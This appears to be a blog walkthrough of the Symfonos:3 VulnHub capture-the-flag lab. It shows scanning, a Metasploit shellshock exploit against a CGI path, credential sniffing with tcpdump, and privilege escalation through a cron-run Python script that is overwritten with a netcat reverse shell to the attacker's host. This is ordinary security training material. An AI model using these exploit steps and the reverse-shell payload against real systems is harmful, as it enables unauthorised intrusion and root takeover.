<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Symfonos:3 Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/symfonos3-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-08-01T13:51:02+00:00">August 1, 2019</time><time class="updated" datetime="2025-06-10T20:11:25+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello, guys today we are going to take a new challenge Symfonos:3, which is a third lab of the series Symfonos. The credit for making this VM machine goes to “Zayotic” and it’s another boot2root challenge where we have to root the server and capture the flag to complete the challenge. You can download this VM <strong><a style="color: #000000;" href="https://www.vulnhub.com/entry/symfonos-3,332/">here</a></strong>.</span></p>
<p><span style="color: #000000;"><strong>Security Level</strong>: Intermediate</span></p>
<h3><span style="color: #800000;"><strong>Penetrating Methodology:</strong></span></h3>
<ol>
<li><span style="color: #000000;"><strong>Scanning</strong></span></li>
</ol>
<ul>
<li><span style="color: #000000;">Netdiscover</span></li>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
<ol start="2">
<li><span style="color: #000000;"><strong>Enumeration</strong></span></li>
</ol>
<ul>
<li><span style="color: #000000;">Web Directory Search </span></li>
</ul>
<ol start="3">
<li><span style="color: #000000;"><strong>Exploitation</strong></span></li>
</ol>
<ul>
<li><span style="color: #000000;">Metasploit</span></li>
<li><span style="color: #000000;">Netcat</span></li>
</ul>
<ol start="4">
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span></li>
</ol>
<ul>
<li><span style="color: #000000;">Exploiting Writable rights</span></li>
</ul>
<h3><span style="color: #000000;">Walkthrough:</span></h3>
<h3><span style="color: #800000;"><strong>Scanning:</strong></span></h3>
<p><span style="color: #000000;">Let’s start off with the scanning process. This target VM took the IP address of 192.168.1.103 automatically from our local Wi-Fi network<strong>.</strong></span></p>
<p><span style="color: #000000;">We used Nmap for port scanning. We found that port 21, 22 and 80 are open.</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.1.103</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DWtXWoRThbo/XULq0cPuK2I/AAAAAAAAfyQ/uZ9chn-0unUsorwFyT0bv9t8R89lt1uqACLcBGAs/s1600/1.png"/></span></p>
<h3><span style="color: #800000;"><strong>Enumeration:</strong></span></h3>
<p><span style="color: #000000;">As we can see port 80 is open, we opened the IP address in our browser and some scary image got displayed. We saved the image and extracted it with <strong>steghide </strong>but there was nothing useful.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rLGPQLV562k/XULq30bo1TI/AAAAAAAAfzA/9YNmtxbwFNInrLqkuSwxSQqLw6QDsfPrACLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Then we looked for the page source, there was one question written in green colour saying <strong>can you bust the underworld? </strong>Which we thought might be some hint to look for some directory may be named underworld.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Zy2ioWq_Sv4/XULq39y8m4I/AAAAAAAAfy8/48AFy7orZlM9SuuBRkMQll_x3cizk4XrwCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">It was time to use <strong>dirb </strong>for directory enumeration to look for some useful directories. We got one directory named <strong>/gate.</strong></span></p>
<pre class="lang:default decode:true">dirb http://192.168.1.103</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qs4GHJTEP_8/XULq301HxCI/AAAAAAAAfzE/esIK9iaINjIGmyJQxLcngdaGc0RMBbP0ACLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">We had a look on this directory in the browser and were presented with one more scary image, As usual, we save the image to look for something useful but there wasn’t anything of our use.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZcAcSNmc_Q4/XULq5siAtEI/AAAAAAAAfzM/XBwbHyI4HLII_tDELcfnGMLiihEl_U1CQCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">We though of again brute-forcing the above URL and this time we did it with <strong>dirbuster.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9YhEQYzt6rc/XULq5t7FPtI/AAAAAAAAfzI/9F_4NTtPL_UdN0kJuOAkRbqBQ_tNt6SKQCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">We got several directories in the result but the one with the name <strong>/cgi-bin/underworld/ </strong>caught our attention.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bZoNwgtYAT4/XULq53PSWpI/AAAAAAAAfzQ/dpUEouVnOagqz08NIn88jrrwnmLIGsW-ACLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">We accessed the URL in the browser and got a webpage displaying information like time, users and load average. I think This is probably shellshock vulnerability</span><img decoding="async" src="https://1.bp.blogspot.com/-1OSjdLyMBuc/XVTyCgi1ZZI/AAAAAAAAgBg/UniPt04Y1n40N5ilEB7OpRz8ytfUY7nVgCLcBGAs/s1600/9.png"/></p>
<h3><span style="color: #800000;"><strong>Exploitation:</strong></span></h3>
<p><span style="color: #000000;">The <strong>CGI</strong> (Common Gateway Interface) defines a way for a web server to interact with external content-generating programs, which are often referred to as <strong>CGI</strong> programs or <strong>CGI</strong> scripts.</span></p>
<p><span style="color: #000000;">We looked on the google to look for any vulnerabilities present in the <strong>CGI</strong> and found that there is a critical vulnerability <strong>shellshock</strong> remote command injection, which allows attackers to execute arbitrary code via the Unix Bash shell remotely.</span></p>
<p><span style="color: #000000;">There is an exploit available in the Metasploit for this vulnerability, we were able to get the meterpreter session using this exploit.</span></p>
<pre class="lang:default decode:true">use exploit/multi/http/apache_mod_cgi_bash_enc_exec
set rhost 192.168.1.103
set lhost 192.168.1.105
set targeturi /cgi-bin/underworld/
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kpSUneJDMJ8/XULq0WjdtNI/AAAAAAAAfyU/IcyRgy3llU8L0z4d8LrIUR8MCTF1vGdngCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">After getting the user-level access, we started exploring options here and there to get to the privileged shell.</span></p>
<p><span style="color: #000000;">We checked for sudo, suid, writable permissions for this user but all in vain. Since <strong>tcpdump</strong> was installed on the target system we didn’t lose our hope and decided to capture the traffic for some time on the loopback interface output it to the <strong>file.pcap </strong>file to look for any credentials if we are lucky enough.</span></p>
<pre class="lang:default decode:true">cd /tmp
tcpdump -D
tcpdump -w file.pcap -i lo</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uwU7WuE1tt8/XULq0YuiLfI/AAAAAAAAfyM/u1MCV9G_VbgH8CwKhzJm7p4wGA9u_47uwCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">We downloaded the <strong>file.pcap </strong>into our Kali.</span></p>
<pre class="lang:default decode:true">ls
download file.pcap /root/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-66wS3344DhQ/XULq1FIrzvI/AAAAAAAAfyY/xq3Y2Pkx1QgOZ2GnhEnI4gxkb2sw290aACLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Opened the captured file in Wireshark, followed the tcp stream of ftp traffic and got one username <strong>hades </strong>and password <strong>PTpZTfU4vxgzvRBE</strong></span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-LG9rdfJ6Oss/XULq1VyzNJI/AAAAAAAAfyc/sTWOcwV6AdI0Ckjr-A86d419m589L2iTQCLcBGAs/s1600/15.png"/></strong></span></p>
<p><span style="color: #000000;">So we have got a username and password for a user <strong>hades.</strong></span></p>
<p><span style="color: #000000;">But before switching to that user we though of trying <strong>pspy32 </strong>script which is a little command-line script which basically monitors scheduled Linux processes. So we uploaded the pspy32 script into the /tmp directory of the target system gave it execution permissions before running it.</span></p>
<pre class="lang:default decode:true">cd /tmp
upload /root/Downloads/pspy32
python -c 'import pty;pty.spawn("/bin/bash")'
chmod 777 pspy32
./pspy32</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--6Ufifajw14/XULq1lUqmFI/AAAAAAAAfyg/xFn5b-gvFvcQnPoCwd1BiJYpvTV16EJdQCLcBGAs/s1600/16.1.png"/></span></p>
<p><span style="color: #000000;">After executing the script, we found a python script <strong>ftpclient.py </strong>which could be on cronjob with root privileges which we can exploit for privilege escalation.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DDPLMr2sD8Y/XULq1xi_JAI/AAAAAAAAfyk/OG1hdJBIxjEeBjTXZizTk7vzZtdhxgXfQCLcBGAs/s1600/16.2.png"/></span></p>
<p><span style="color: #000000;">As we already have credentials of one more user <strong>hades. </strong>We tried to switch user and were successfully able to do that. We looked for the writable directories for this user and got one directory named <strong>/opt/ftpclient.</strong></span></p>
<p><span style="color: #000000;">So what actually we have got so far is a writable directory /opt/ftpclient in which there is a script <strong>ftpclient.py.</strong></span></p>
<pre class="lang:default decode:true">find /-writable -type d 2&gt;/dev/null
cd /opt/ftpclient</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-p8rmm5bV9wA/XULq2CWzWMI/AAAAAAAAfyo/xnrJ2uyMXJUwjYg2_1wM4bJExejDQS0KACLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">We looked inside the file using cat, there was nothing of our importance.</span></p>
<p><span style="color: #000000;">So we removed the existing <strong>ftpclient.py </strong>file only to replace with our customized one.</span></p>
<pre class="lang:default decode:true">ls
cat ftpclient.py
rm ftpclient.py</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-Qfoaaca417k/XULq2iMibqI/AAAAAAAAfys/w0JO0qAfb-MkBgicgmIit7dn60buvC2NgCLcBGAs/s1600/17.1.png"/></strong></span></p>
<p><span style="color: #000000;">We first created a new ftpclient.py file in our kali in which we put a reverse netcat shell.</span></p>
<pre class="lang:default decode:true">import sys
import os
os.system("nc -e /bin/bash 192.168.1.105 1234")</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oZdtXW4M4pQ/XULq278hfdI/AAAAAAAAfyw/msQ6fvmD4qcvaw-SY2Qp53haRt4lZ4COwCLcBGAs/s1600/17.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation:</strong></span></h3>
<p><span style="color: #000000;">We downloaded the same file into <strong>/opt/ftpclient </strong>directory of the target system using the <strong>wget </strong>command. Since the script was on cronjob it will automatically get executed and hoped to get the reverse root shell on our kali system where we already have started the netcat listener.</span></p>
<pre class="lang:default decode:true">wget http://192.168.1.105:8000/ftpclient.py
nc -lvp 1234
id
cd /root
cat proof.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LE2HAl9CVxk/XULq3HtVJII/AAAAAAAAfy0/6SGAQrZJ-n4JgOJGmxUk_sJg6GZlajLRACLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;">After waiting for some time, we got the <strong>root shell </strong>of the target system and eventually got the <strong>root flag.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7Ldwbx-4cnU/XULq3HSBhnI/AAAAAAAAfy4/2_5p-krSoLwmbX33D3VBWOXcP9e9RXTygCLcBGAs/s1600/19.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Auqib Wani is a Certified Ethical Hacker, Penetration Tester and a Tech Enthusiast with more than 5 years of experience in the field of Network &amp; Cyber Security. Contact <strong><a style="color: #000000;" href="https://www.linkedin.com/in/auqib-wani-14210a71/">Here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
